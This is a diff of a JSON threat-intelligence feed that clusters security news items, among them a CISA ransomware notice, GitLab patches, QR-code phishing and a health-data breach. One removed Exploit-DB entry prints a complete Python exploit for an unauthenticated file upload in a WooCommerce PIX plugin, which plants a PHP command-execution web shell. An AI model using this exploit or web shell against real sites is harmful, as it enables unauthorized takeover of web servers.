-        "full_body": "CISA: Windows Task Host flaw now exploited by ransomware gangs By Sergiu Gatlan August 18, 2026 06:32 AM 0 The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. Task Host is a core Windows system component that allows DLL-based processes to run in the background and prevents data corruption by ensuring they close properly during shutdown. Tracked as CVE-2025-60710 , this Windows privilege escalation security flaw was patched by Microsoft in November 2025 and stems from a link following weakness that affects Windows 11 and Windows Server 2025 devices. Following successful exploitation, local attackers with basic user permissions can gain SYSTEM privileges and take full control of unpatched devices. While it didn't share any details regarding ongoing attacks and Microsoft has yet to update its security advisory to confirm in-the-wild exploitation, CISA added CVE-2025-60710 to its list of actively exploited vulnerabilities on April 13 and gave Federal Civilian Executive Branch (FCEB) agencies two weeks to secure their systems. On Friday, CISA updated its Known Exploited Vulnerabilities Catalog (KEV) again, flagging the security vulnerability as being abused by ransomware gangs . The U.S. cybersecurity agency has not yet shared any information about attacks targeting CVE-2025-60710, and a Microsoft spokesperson was not immediately available for comment when BleepingComputer reached out earlier today. \"This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise,\" CISA warned. \"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.\" One week ago, CISA also warned that ransomware gangs have begun exploiting a Microsoft SharePoint remote code execution vulnerability (CVE-2026-45659) after confirming active exploitation in early July . Since November 2021, the agency has flagged 383 actively exploited vulnerabilities in various Microsoft products , 112 of which have also been exploited in ransomware attacks. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA: Windows BlueHammer flaw now exploited by ransomware gangs CISA orders feds to patch BlueHammer flaw exploited as zero-day Microsoft working on Defender patch for ShieldBreak zero-day Windows LegacyHive zero-day flaw gets free, unofficial patches CISA: Microsoft SharePoint flaw now exploited in ransomware attacks",
+        "full_body": "CISA: Windows Task Host flaw now exploited by ransomware gangs By Sergiu Gatlan August 18, 2026 06:32 AM 0 The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has confirmed that ransomware gangs are also exploiting a high-severity Windows Task Host vulnerability that was flagged as actively exploited in April. Task Host is a core Windows system component that allows DLL-based processes to run in the background and prevents data corruption by ensuring they close properly during shutdown. Tracked as CVE-2025-60710 , this Windows privilege escalation security flaw was patched by Microsoft in November 2025 and stems from a link following weakness that affects Windows 11 and Windows Server 2025 devices. Following successful exploitation, local attackers with basic user permissions can gain SYSTEM privileges and take full control of unpatched devices. While it didn't share any details regarding ongoing attacks and Microsoft has yet to update its security advisory to confirm in-the-wild exploitation, CISA added CVE-2025-60710 to its list of actively exploited vulnerabilities on April 13 and gave Federal Civilian Executive Branch (FCEB) agencies two weeks to secure their systems. \"We addressed CVE-2025-60710 in our November 2025 security update release and recommend customers apply the update to remain protected,\" a Microsoft spokesperson told BleepingComputer. \"Customers who have already applied the update are protected and do not need to take further action.\" On Friday, CISA updated its Known Exploited Vulnerabilities Catalog (KEV) again, flagging the security vulnerability as being abused by ransomware gangs . The U.S. cybersecurity agency has not yet shared any information about attacks targeting CVE-2025-60710, and a Microsoft spokesperson was not immediately available for comment when BleepingComputer reached out earlier today. \"This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise,\" CISA warned. \"Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable.\" One week ago, CISA also warned that ransomware gangs have begun exploiting a Microsoft SharePoint remote code execution vulnerability (CVE-2026-45659) after confirming active exploitation in early July . Since November 2021, the agency has flagged 383 actively exploited vulnerabilities in various Microsoft products , 112 of which have also been exploited in ransomware attacks. Update August 19, 02:54 EDT: Added Microsoft statement. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA: Windows BlueHammer flaw now exploited by ransomware gangs CISA orders feds to patch BlueHammer flaw exploited as zero-day Microsoft working on Defender patch for ShieldBreak zero-day Windows LegacyHive zero-day flaw gets free, unofficial patches CISA: Microsoft SharePoint flaw now exploited in ransomware attacks",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
@@ -2814,103 +2814,6 @@
       ]
     },
     {
-      "cluster_id": "ad3b948659",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "WordPress"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-3891"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Exploit-DB",
-        "cohort": "offensive_vulnerability_research",
-        "title": "[webapps] WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload",
-        "link": "https://www.exploit-db.com/exploits/52642",
-        "published": "2026-08-17T00:00:00+00:00",
-        "summary": "WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload EDB-ID: 52642 CVE: 2026-3891 EDB Verified: Author: Mohammad Hossein Sadeghian Type: webapps Exploit: / Platform: Multiple Date: 2026-08-17 Vulnerable App: # Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload # Google Dork: N/A # Date: 2026-07-15 # Exploit Author: Mohammad Hossein Sadeghian # Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Version: <= 1.5.0 # Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7 # CVE: CVE-2026-3891 import requests import sys def print_banner(): banner = r\"\"\" ____ __ _ __ __ / __ \\________ ____ _____/ / / | / /__ / /_ / / / / ___/ _ \\/ __ \\/ __ / / |/ / _ \\/ __/ / /_/ / / / __/ /_/ / /_/ / / /| / __/ /_ /_____/_/ \\___/\\__,_/\\__,_/ /_/ |_/\\___/\\__/ Author: m4sh_wacker \"\"\" print(banner) def main(): print_banner() target = input(\"[?] Enter target URL: \").strip().rstrip(\"/\") if not target.startswith((\"http://\", \"https://\")): target = \"http://\" + target ajax_url = f\"{target}/wp-admin/admin-ajax.php\" filename = \"woocommerce.php\" content = '<?php if(isset($_REQUEST[\"cmd\"])){system($_REQUEST[\"cmd\"]);} ?>' session = requests.Session() print(\"\\n[*] Requesting nonce...\") try: response = session.post( ajax_url, data={ \"action\": \"lkn_pix_for_woocommerce_generate_nonce\", \"action_name\": \"lkn_pix_for_woocommerce_c6_settings_nonce\" }, timeout=10 ) result = response.json() nonce = result[\"data\"][\"nonce\"] print(f\"[+] Nonce obtained: {nonce}\") except Exception as e: print(f\"[-] Failed to obtain nonce: {e}\") sys.exit(1) print(f\"[*] Uploading {filename}...\") try: response = session.post( ajax_url, data={ \"action\": \"lkn_pix_for_woocommerce_c6_save_settings\", \"_ajax_nonce\": nonce }, files={ \"certificate_crt_path\": ( filename, content, \"text/plain\" ) }, timeout=10 ) result = response.json() if not result.get(\"success\"): print(\"[-] Upload failed.\") print(response.text) sys.exit(1) except Exception as e: print(f\"[-] Upload error: {e}\") sys.exit(1) uploaded_url = ( f\"{target}/wp-content/plugins/\" f\"payment-gateway-pix-for-woocommerce/\" f\"Includes/files/certs_c6/{filename}\" ) print(\"\\n[+] File uploaded successfully!\") print(f\"[+] URL: {uploaded_url}\") if __name__ == \"__main__\": main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "WordPress"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-3891"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "WordPress": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Exploit-DB",
-          "cohort": "offensive_vulnerability_research",
-          "title": "[webapps] WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload",
-          "link": "https://www.exploit-db.com/exploits/52642",
-          "published": "2026-08-17T00:00:00+00:00",
-          "summary": "WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "WordPress"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-3891"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "6c4f057b27",
       "priority_score": 13,
       "member_count": 1,
@@ -3257,7 +3160,7 @@
     {
       "cluster_id": "a50e916d10",
       "priority_score": 12,
-      "member_count": 2,
+      "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [
         "CVE-2026-58231"
@@ -3291,7 +3194,6 @@
           "preauth_unauth"
         ],
         "content_type": [
-          "news_report",
           "vulnerability_disclosure"
         ],
         "confidence_tier": [
@@ -3629,8 +3531,7 @@
       "taxonomy": {
         "threat_categories": [
           "active_exploitation",
-          "data_breach",
-          "zero_day"
+          "data_breach"
         ],
         "actor_attribution": [],
         "affected_industries": [
@@ -3650,9 +3551,7 @@
         "attack_techniques": [],
         "urgency_signals": [
           "actively_exploited",
-          "no_patch_yet",
-          "preauth_unauth",
-          "zero_day"
+          "preauth_unauth"
         ],
         "content_type": [
           "news_report",
@@ -3669,11 +3568,10 @@
         "link": "https://www.securityweek.com/gitlab-patches-critical-code-injection-vulnerability/",
         "published": "2026-08-18T08:51:07+00:00",
         "summary": "The security defect allows unauthenticated attackers to modify or delete user data and public projects. The post GitLab Patches Critical Code Injection Vulnerability appeared first on SecurityWeek .",
-        "full_body": "GitLab on Monday rolled out patches for two vulnerabilities, including a critical-severity code injection flaw that can be exploited without authentication. Tracked as CVE-2026-19478 (CVSS score of 9.4), the security defect allows attackers to modify or delete user data and public projects via a GraphQL directive, GitLab explains in its advisory . The second bug is CVE-2026-19650 (CVSS score of 7.1), a cross-site request forgery (CSRF) issue impacting the GraphQL multiplex query handler. “GitLab has remediated an issue that under certain conditions could have allowed an unauthenticated user to execute mutations via GET requests due to improper request validation in GraphQL multiplex query handling,” the advisory reads. The two vulnerabilities impact all GitLab Community Edition (CE) and Enterprise Edition (EE) versions from 18.2, 19.0, 19.1, and 19.2 onwards. They were addressed in GitLab CE/EE versions 18.11.11, 19.0.8, 19.1.6, and 19.2.4. “We strongly recommend that all self-managed GitLab installations be upgraded to one of these versions immediately,” GitLab notes. Advertisement. Scroll to continue reading. The patches were automatically applied to GitLab.com and GitLab Dedicated, and no action is required from their users. GitLab says both security defects were reported via its HackerOne bug bounty program. The code management and sharing platform makes no mention of any of these vulnerabilities being exploited in the wild. Related: Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates Related: In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Related: Is Patching Dead? Vulnerability Management in the Post-Mythos Era Related: WordPress 7.0.4 Patches Remote Code Execution Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 680,000 Impacted by French Tax Authority Data Breach 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Fortune 500 Companies Hit in Azure Data Theft Campaign Trivy, Not LiteLLM Behind the 2,500 Org Compromise 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day Latest News Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw Heights Finance Data Breach Impacts at Least 1.2 Million Individuals Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace with AI, or if it’s time to rethink prevention as the strongest default. Register Virtual Event: CodeSecCon 2026 August 19, 2026 CodeSecCon bridges the gap between dev and security. Discover best practices for secure coding, innovative risk-reduction tools, and safe AI integration to cultivate a true DevSecOps culture. Safely secure your apps! Register People on the Move Dali Rajic is joining OpenAI as Chief Revenue Officer. Erika Dean has been appointed Chief Information Security Officer at Tricentis. C1 has named Jeff St. Clair Chief Revenue Officer. More People On The Move Expert Insights The ",
+        "full_body": "GitLab on Monday rolled out patches for two vulnerabilities, including a critical-severity code injection flaw that can be exploited without authentication. Tracked as CVE-2026-19478 (CVSS score of 9.4), the security defect allows attackers to modify or delete user data and public projects via a GraphQL directive, GitLab explains in its advisory . The second bug is CVE-2026-19650 (CVSS score of 7.1), a cross-site request forgery (CSRF) issue impacting the GraphQL multiplex query handler. “GitLab has remediated an issue that under certain conditions could have allowed an unauthenticated user to execute mutations via GET requests due to improper request validation in GraphQL multiplex query handling,” the advisory reads. The two vulnerabilities impact all GitLab Community Edition (CE) and Enterprise Edition (EE) versions from 18.2, 19.0, 19.1, and 19.2 onwards. They were addressed in GitLab CE/EE versions 18.11.11, 19.0.8, 19.1.6, and 19.2.4. “We strongly recommend that all self-managed GitLab installations be upgraded to one of these versions immediately,” GitLab notes. Advertisement. Scroll to continue reading. The patches were automatically applied to GitLab.com and GitLab Dedicated, and no action is required from their users. GitLab says both security defects were reported via its HackerOne bug bounty program. The code management and sharing platform makes no mention of any of these vulnerabilities being exploited in the wild. Related: Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates Related: In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Related: Is Patching Dead? Vulnerability Management in the Post-Mythos Era Related: WordPress 7.0.4 Patches Remote Code Execution Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates 680,000 Impacted by French Tax Authority Data Breach 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Fortune 500 Companies Hit in Azure Data Theft Campaign Trivy, Not LiteLLM Behind the 2,500 Org Compromise 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Latest News CareCloud Data Breach Impact Grows to 3.7 Million Individuals Webinar Today: Rethinking Cyber Defense for AI-Speed Attacks CISO Conversations: Nico Waisman – From Self-Taught Hacker to AI-Driven Offensive Security at XBOW AI-Driven Vulnerability Surge Breaks the Traditional Patching Model Xpander Raises $7.5 Million for AI Management and Governance Fortinet Acquires AI Security Company Virtue AI 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw Heights Finance Data Breach Impacts at Least 1.2 Million Individuals Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace with AI, or if it’s time to rethink prevention as the strongest default. Register Virtual Event: CodeSecCon 2026 August 19, 2026 CodeSecCon bridges the gap between dev and security. Discover best practices for secure coding, innovative risk-reduction tools, and safe AI integration to cultivate a true DevSecOps culture. Safely secure your apps! Register People on the Move Dali Rajic is joining OpenAI as Chief Revenue Officer. Erika Dean has been appointed Chief Information Security Officer at Tricentis. C1 has named Jeff St. Clair Chief Revenue Officer. More People On The Move Expert",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
-            "zero_day",
             "data_breach",
             "active_exploitation"
           ],
@@ -3695,9 +3593,7 @@
           "attack_techniques": [],
           "urgency_signals": [
             "actively_exploited",
-            "zero_day",
-            "preauth_unauth",
-            "no_patch_yet"
+            "preauth_unauth"
           ],
           "content_type": "vulnerability_disclosure",
           "confidence_tier": "tier_4_news",
@@ -3723,7 +3619,6 @@
           "summary": "The security defect allows unauthenticated attackers to modify or delete user data and public projects. The post GitLab Patches Critical Code Injection Vulnerability appeared first on SecurityWeek .",
           "taxonomy": {
             "threat_categories": [
-              "zero_day",
               "data_breach",
               "active_exploitation"
             ],
@@ -3745,9 +3640,7 @@
             "attack_techniques": [],
             "urgency_signals": [
               "actively_exploited",
-              "zero_day",
-              "preauth_unauth",
-              "no_patch_yet"
+              "preauth_unauth"
             ],
             "content_type": "vulnerability_disclosure",
             "confidence_tier": "tier_4_news",
@@ -4470,6 +4363,87 @@
       ]
     },
     {
+      "cluster_id": "8883aedcfe",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "phishing_social_eng"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "ESET WeLiveSecurity",
+        "cohort": "threat_research_primary",
+        "title": "How QR-code phishing can slip past corporate security measures",
+        "link": "https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/",
+        "published": "2026-08-17T09:00:00+00:00",
+        "summary": "Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.",
+        "full_body": "Business Security How QR-code phishing can slip past corporate security measures Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap. Phil Muncaster 17 Aug 2026 • , 5 min. read Familiarity might breed contempt. But in the world of cybersecurity, it also breeds complacency, which can be a lot more dangerous. So it is with QR codes, which have become a common sight on menus, lampposts and parking meters – and, increasingly, in emails over recent years. The challenge is that they’re also a great way to disguise malicious links, bypass some traditional corporate security filters, and to move the interaction from a corporate computer to a personal phone with fewer security controls. Attackers will continue to experiment and innovate with new ways to avoid detection. And new “quishing” techniques to snare unwitting employees. Here’s what you need to understand to keep your organization safe. Why is quishing so dangerous? Short for ‘Quick Response’, a QR code is a two-dimensional barcode that can encode URLs, payment details, contact information and other data, helping users get quickly from A to B – the destination in this case usually being a website or app. They appeal to threat actors for several reasons. Their widespread use, accelerated by the demand for contactless interactions during the pandemic, has made scanning them an ordinary part of daily life. That means we’re more likely to get our phones out to scan them today than a few years back. They also slot neatly into phishing workflows – just replace that malicious link or attachment with a QR code. And they can be generated in seconds. In fact, many phishing kits will have a dedicated QR-code generator. Most importantly, they take the victim from a relatively well-protected corporate environment to a potentially unmanaged mobile device, thus bypassing business-grade security. One important advantage for the attacker is concealment. The destination is encoded in a visual pattern, not displayed as readable text, which hides the malicious URLs behind them so that some traditional email filters can’t extract and inspect them. Sometimes they’re further obfuscated by being embedded in PDF or JPEG attachments. That means they’re more likely to end up in your employees’ inboxes. And when they do, your staff may struggle to discern a real message from a malicious one. There’s typically not much text to analyze for typos or grammatical mistakes. And because the link is effectively encoded in a visual pattern, it’s invisible to the human eye. If used in conjunction with a trusted brand – say, a DocuSign email or an update from Microsoft – the quishing attack leverages similar social engineering tactics as classic phishing messages. Trusted branding reassures the victim that they can click through. And a sense of urgency is often created by the pretext. Malicious QR codes are frequently embedded in alerts urging users to secure their account, or authenticate to confirm their details. In fact, according to the ESET Threat Report H1 2026 , malicious QR codes were embedded in no fewer than 11 percent of all phishing email in the first half of 2026. “ESET tracks quishing emails under the detection name QRCode/Phishing. This detection works through a dedicated layer of the ESET email scanner, designed to identify QR codes in the vast majority of file types, and to decode the URLs in them. The extracted URLs are scanned using ESET anti-phishing, anti-malware, and anti-spam engines; any harmful URLs are blocked, and the associated emails flagged or deleted,” says the report. QRCode/Phishing detection trend from September 2025 to May 2026, seven-day moving average (source: ESET Threat Report H1 2026 ) Threat actors continue to innovate As with any threat landscape trend, malicious actors continue to hone their efforts for maximum impact. Quishing attacks are being used not only to install malware and steal credentials but also harvest MFA",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "phishing_social_eng"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "ESET WeLiveSecurity",
+          "cohort": "threat_research_primary",
+          "title": "How QR-code phishing can slip past corporate security measures",
+          "link": "https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/",
+          "published": "2026-08-17T09:00:00+00:00",
+          "summary": "Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.",
+          "taxonomy": {
+            "threat_categories": [
+              "phishing_social_eng"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "452d902ac4",
       "priority_score": 10,
       "member_count": 1,
@@ -4652,87 +4626,6 @@
             "role_map": {
               "Cisco": "target"
             },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "8883aedcfe",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "ESET WeLiveSecurity",
-        "cohort": "threat_research_primary",
-        "title": "How QR-code phishing can slip past corporate security measures",
-        "link": "https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/",
-        "published": "2026-08-17T09:00:00+00:00",
-        "summary": "Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.",
-        "full_body": "Business Security How QR-code phishing can slip past corporate security measures Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap. Phil Muncaster 17 Aug 2026 • , 5 min. read Familiarity might breed contempt. But in the world of cybersecurity, it also breeds complacency, which can be a lot more dangerous. So it is with QR codes, which have become a common sight on menus, lampposts and parking meters – and, increasingly, in emails over recent years. The challenge is that they’re also a great way to disguise malicious links, bypass some traditional corporate security filters, and to move the interaction from a corporate computer to a personal phone with fewer security controls. Attackers will continue to experiment and innovate with new ways to avoid detection. And new “quishing” techniques to snare unwitting employees. Here’s what you need to understand to keep your organization safe. Why is quishing so dangerous? Short for ‘Quick Response’, a QR code is a two-dimensional barcode that can encode URLs, payment details, contact information and other data, helping users get quickly from A to B – the destination in this case usually being a website or app. They appeal to threat actors for several reasons. Their widespread use, accelerated by the demand for contactless interactions during the pandemic, has made scanning them an ordinary part of daily life. That means we’re more likely to get our phones out to scan them today than a few years back. They also slot neatly into phishing workflows – just replace that malicious link or attachment with a QR code. And they can be generated in seconds. In fact, many phishing kits will have a dedicated QR-code generator. Most importantly, they take the victim from a relatively well-protected corporate environment to a potentially unmanaged mobile device, thus bypassing business-grade security. One important advantage for the attacker is concealment. The destination is encoded in a visual pattern, not displayed as readable text, which hides the malicious URLs behind them so that some traditional email filters can’t extract and inspect them. Sometimes they’re further obfuscated by being embedded in PDF or JPEG attachments. That means they’re more likely to end up in your employees’ inboxes. And when they do, your staff may struggle to discern a real message from a malicious one. There’s typically not much text to analyze for typos or grammatical mistakes. And because the link is effectively encoded in a visual pattern, it’s invisible to the human eye. If used in conjunction with a trusted brand – say, a DocuSign email or an update from Microsoft – the quishing attack leverages similar social engineering tactics as classic phishing messages. Trusted branding reassures the victim that they can click through. And a sense of urgency is often created by the pretext. Malicious QR codes are frequently embedded in alerts urging users to secure their account, or authenticate to confirm their details. In fact, according to the ESET Threat Report H1 2026 , malicious QR codes were embedded in no fewer than 11 percent of all phishing email in the first half of 2026. “ESET tracks quishing emails under the detection name QRCode/Phishing. This detection works through a dedicated layer of the ESET email scanner, designed to identify QR codes in the vast majority of file types, and to decode the URLs in them. The extracted URLs are scanned using ESET anti-phishing, anti-malware, and anti-spam engines; any harmful URLs are blocked, and the associated emails flagged or deleted,” says the report. QRCode/Phishing detection trend from September 2025 to May 2026, seven-day moving average (source: ESET Threat Report H1 2026 ) Threat actors continue to innovate As with any threat landscape trend, malicious actors continue to hone their efforts for maximum impact. Quishing attacks are being used not only to install malware and steal credentials but also harvest MFA",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "ESET WeLiveSecurity",
-          "cohort": "threat_research_primary",
-          "title": "How QR-code phishing can slip past corporate security measures",
-          "link": "https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/",
-          "published": "2026-08-17T09:00:00+00:00",
-          "summary": "Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -5114,6 +5007,148 @@
             },
             "weak_tags": {
               "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "696cb9ee63",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "healthcare",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "GitLab",
+          "Google Cloud",
+          "Microsoft SharePoint"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "poc_available"
+        ],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "SecurityWeek",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "CareCloud Data Breach Impact Grows to 3.7 Million Individuals",
+        "link": "https://www.securityweek.com/carecloud-data-breach-impact-grows-to-3-7-million-individuals/",
+        "published": "2026-08-19T06:56:43+00:00",
+        "summary": "The data breach was initially believed to affect roughly 350,000 people, but the HHS breach tracker shows a far bigger impact. The post CareCloud Data Breach Impact Grows to 3.7 Million Individuals appeared first on SecurityWeek .",
